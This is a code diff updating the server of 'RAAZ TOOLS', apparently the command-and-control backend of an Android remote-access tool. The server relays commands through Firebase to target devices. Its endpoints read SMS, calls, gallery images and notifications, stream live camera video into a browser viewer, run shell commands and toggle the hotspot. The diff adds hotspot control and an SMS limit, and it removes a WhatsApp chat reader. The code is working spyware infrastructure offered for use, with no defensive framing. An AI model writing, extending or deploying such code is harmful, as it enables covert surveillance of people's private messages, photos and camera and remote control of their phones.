@@ -1,8 +1,7 @@
 // ╔══════════════════════════════════════════════════════════════╗
-// ║         RAAZ TOOLS - SERVER v4.0 (Render Deploy)            ║
-// ║  SMS Read+Send, Calls, Gallery Fix, WhatsApp, APK Auto,     ║
-// ║  Notifications, SIM, Battery, Toast Lock, Live Camera,      ║
-// ║  Internet CMD, Flashlight, HTML Viewer                      ║
+// ║         RAAZ TOOLS - SERVER v4.1 (Render Deploy)            ║
+// ║  SMS (latest 10), Calls, Gallery, APK Auto, Notifications,  ║
+// ║  SIM, Battery, Toast, Live Camera, Shell CMD, Hotspot       ║
 // ╚══════════════════════════════════════════════════════════════╝
 
 const express = require('express');
@@ -15,7 +14,7 @@ const PORT    = process.env.PORT || 3000;
 const serviceAccount = require('./serviceAccountKey.json');
 admin.initializeApp({
   credential:  admin.credential.cert(serviceAccount),
-  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // <-- REPLACE with your DB URL
+  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // <-- REPLACE
 });
 const db = admin.database();
 
@@ -78,7 +77,7 @@ async function pushRequest(deviceId, type, extra = {}) {
 //   ROOT
 // ════════════════════════════════════════════════════════════════
 app.get('/', (req, res) => {
-  res.json({ status: '✅ RAAZ TOOLS v4.0', message: 'All systems operational' });
+  res.json({ status: '✅ RAAZ TOOLS v4.1', message: 'Hotspot control added, SMS latest only, WhatsApp removed' });
 });
 
 // ════════════════════════════════════════════════════════════════
@@ -176,12 +175,13 @@ app.get('/api/battery/:deviceId', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
-//   SMS READ
+//   SMS READ (with limit for latest only)
 // ════════════════════════════════════════════════════════════════
 app.get('/api/sms/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
+  const limit = parseInt(req.query.limit) || 10; // default to latest 10
   try {
-    const requestId = await pushRequest(deviceId, 'sms');
+    const requestId = await pushRequest(deviceId, 'sms', { limit });
     const response = await waitForResponse(deviceId, 'sms', requestId, 15000);
     res.json({ smsList: response.smsList || [] });
   } catch (e) { res.status(408).json({ error: e.message, smsList: [] }); }
@@ -227,18 +227,6 @@ app.get('/api/gallery/:deviceId', async (req, res) => {
     const response = await waitForResponse(deviceId, 'gallery', requestId, 30000);
     res.json({ images: response.images || [] });
   } catch (e) { res.status(408).json({ error: e.message, images: [] }); }
-});
-
-// ════════════════════════════════════════════════════════════════
-//   WHATSAPP (requires separate logging on device)
-// ════════════════════════════════════════════════════════════════
-app.get('/api/whatsapp/:deviceId', async (req, res) => {
-  const { deviceId } = req.params;
-  try {
-    const requestId = await pushRequest(deviceId, 'whatsapp');
-    const response = await waitForResponse(deviceId, 'whatsapp', requestId, 15000);
-    res.json({ chats: response.chats || [] });
-  } catch (e) { res.status(408).json({ error: e.message, chats: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
@@ -354,10 +342,33 @@ app.post('/api/dismissToast', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
+//   HOTSPOT CONTROL (NEW)
+// ════════════════════════════════════════════════════════════════
+// Turn hotspot on/off/toggle
+app.post('/api/hotspot/:deviceId', async (req, res) => {
+  const { deviceId } = req.params;
+  const { action } = req.body; // action = "on", "off", "toggle"
+  if (!action || !['on','off','toggle'].includes(action))
+    return res.status(400).json({ error: 'action must be "on", "off", or "toggle"' });
+  try {
+    const key = await pushCommand(deviceId, `hotspot ${action}`);
+    res.json({ status: 'queued', key, action });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Get hotspot status (requires device to respond)
+app.get('/api/hotspot/status/:deviceId', async (req, res) => {
+  const { deviceId } = req.params;
+  try {
+    const requestId = await pushRequest(deviceId, 'hotspotStatus');
+    const response = await waitForResponse(deviceId, 'hotspotStatus', requestId, 10000);
+    res.json({ status: response.status || 'unknown', details: response.details || {} });
+  } catch (e) { res.status(408).json({ error: e.message, status: 'unknown' }); }
+});
+
+// ════════════════════════════════════════════════════════════════
 //   LIVE CAMERA — MJPEG Stream
 // ════════════════════════════════════════════════════════════════
-
-// MJPEG stream endpoint (for mpv, curl, etc.)
 app.get('/api/camera/stream/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const camera = req.query.camera || 'back';
@@ -389,7 +400,6 @@ app.get('/api/camera/stream/:deviceId', async (req, res) => {
   });
 });
 
-// Android app posts JPEG frames here
 app.post('/api/camera/frame', (req, res) => {
   const { deviceId, frameBase64 } = req.body;
   if (!deviceId || !frameBase64) return res.status(400).json({ error: 'Missing data' });
@@ -414,7 +424,6 @@ app.post('/api/camera/frame', (req, res) => {
   }
 });
 
-// Single snapshot
 app.get('/api/camera/snapshot/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const camera = req.query.camera || 'back';
@@ -430,7 +439,6 @@ app.get('/api/camera/snapshot/:deviceId', async (req, res) => {
   } catch (e) { res.status(408).json({ error: e.message }); }
 });
 
-// HTML Viewer for browser
 app.get('/view/:deviceId', (req, res) => {
   const { deviceId } = req.params;
   const camera = req.query.camera || 'back';
@@ -488,13 +496,13 @@ app.delete('/api/clear/:deviceId', async (req, res) => {
 const server = http.createServer(app);
 server.listen(PORT, () => {
   console.log(`
-╔══════════════════════════════════════════╗
-║   ✅  RAAZ TOOLS SERVER v4.0            ║
-║   🚀  Port     : ${PORT}                    ║
-║   📷  Camera   : MJPEG Live Stream      ║
-║   🌐  HTML Viewer : /view/:deviceId     ║
-║   📤  SMS Send : Active                 ║
-║   🌐  Internet CMD : Active             ║
-║   🔥  Toast Lock : Active               ║
-╚══════════════════════════════════════════╝`);
+╔══════════════════════════════════════════════════════╗
+║   ✅ RAAZ TOOLS SERVER v4.1                         ║
+║   🚀 Port     : ${PORT}                              ║
+║   🔥 Hotspot  : ON/OFF/Toggle + Status              ║
+║   📱 SMS      : Latest only (limit param)           ║
+║   📷 Camera   : MJPEG Live Stream                    ║
+║   🌐 HTML Viewer : /view/:deviceId                   ║
+║   ⌨️ Shell CMD : /api/cmd                            ║
+╚══════════════════════════════════════════════════════╝`);
 });
